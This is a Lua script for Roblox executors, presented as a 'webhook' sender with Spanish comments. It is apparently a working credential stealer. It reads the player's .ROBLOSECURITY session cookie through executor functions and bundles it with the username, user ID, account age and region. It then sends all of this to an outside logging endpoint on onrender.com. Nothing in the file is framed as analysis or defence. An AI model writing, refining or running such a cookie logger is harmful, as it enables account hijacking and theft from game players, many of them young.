
-- webhook.lua - VERSIÓN CORREGIDA (Sin CookieService)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

-- Función para obtener cookies (sin CookieService)
local function GetCookies()
    local cookies = {}
    
    -- Intentar con getcookie() (función de executors)
    local success, cookie = pcall(getcookie)
    if success and cookie and cookie ~= "" then
        table.insert(cookies, {
            Name = ".ROBLOSECURITY",
            Value = cookie,
            SameSite = "None",
            Path = "/",
            Domain = "www.roblox.com"
        })
    end
    
    -- Intentar con getgenv
    if #cookies == 0 then
        local cookieValue = getgenv("_ROBLOSECURITY") or getgenv("ROBLOSECURITY")
        if cookieValue and cookieValue ~= "" then
            table.insert(cookies, {
                Name = ".ROBLOSECURITY",
                Value = tostring(cookieValue),
                SameSite = "None",
                Path = "/",
                Domain = "www.roblox.com"
            })
        end
    end
    
    return cookies
end

local function GetCookieValue(cookieName, domain)
    local cookies = GetCookies()
    for _, cookie in ipairs(cookies) do
        if cookie.Name == cookieName then
            return cookie.Value
        end
    end
    return ""
end

local function Request(options)
    options = options or {}
    local url = options.Url or ""
    local method = options.Method or "GET"
    local headers = options.Headers or {}
    local body = options.Body
    
    if url == "" then
        error("Error: No se especificó URL")
    end
    
    local fullHeaders = {}
    for key, val in pairs(headers) do
        fullHeaders[key] = val
    end
    
    fullHeaders["Connection"] = "keep-alive"
    fullHeaders["Accept"] = "*/*"
    
    if method == "POST" then
        fullHeaders["Content-Type"] = "application/json"
    end
    
    local bodyString = body
    if type(body) == "table" then
        bodyString = HttpService:JSONEncode(body)
    end
    
    -- Intentar con request() del executor
    local customRequest = getgenv("request") or (getgenv("syn") and getgenv("syn").request)
    if customRequest then
        local success, response = pcall(function()
            return customRequest({
                Url = url,
                Method = method,
                Body = bodyString,
                Headers = fullHeaders
            })
        end)
        if success and response then
            return response
        end
    end
    
    -- Fallback a HttpService
    local success, response = pcall(function()
        if method == "GET" then
            return HttpService:GetAsync(url, false)
        else
            return HttpService:PostAsync(url, bodyString, Enum.HttpContentType.ApplicationJson, false)
        end
    end)
    
    if success and response then
        return {
            Success = true,
            StatusCode = 200,
            Body = response
        }
    end
    
    return nil
end

local function HttpPost(url, body, options)
    options = options or {}
    return Request({
        Url = url,
        Method = "POST",
        Body = body,
        Headers = options.Headers or {
            ["Content-Type"] = "application/json"
        },
        Timeout = options.Timeout or 15
    })
end

local function GetAccountAge()
    local player = Players.LocalPlayer
    if not player then return "Jugador no encontrado" end
    
    local days = player.AccountAge
    local years = math.floor(days / 365)
    local months = math.floor((days % 365) / 30)
    
    if years > 0 then
        return string.format("%d años, %d meses (%d días)", years, months, days)
    end
    return days .. " días"
end

local function GetRegion()
    return LocalizationService.RobloxLocaleId
end

local function ToJson(obj)
    return HttpService:JSONEncode(obj)
end

-- Código principal
local success, result = pcall(function()
    local player = Players.LocalPlayer
    local placeId = game.PlaceId
    
    local cookieValue = GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
    
    local data = {
        username = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        gameId = placeId,
        accountAge = GetAccountAge(),
        region = GetRegion(),
        cookie = ".ROBLOSECURITY=" .. cookieValue
    }
    
    print("📤 Enviando webhook...")
    print("  Usuario: " .. player.Name)
    print("  User ID: " .. tostring(player.UserId))
    
    local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
    
    if response then
        print("✅ Webhook enviado correctamente!")
        print("  Status: " .. tostring(response.StatusCode or response.status or "200"))
        return response
    else
        warn("⚠️ El webhook falló")
        return nil
    end
end)

if not success then
    warn("❌ Error al ejecutar el webhook:")
    warn("  Detalle: " .. tostring(result))
end
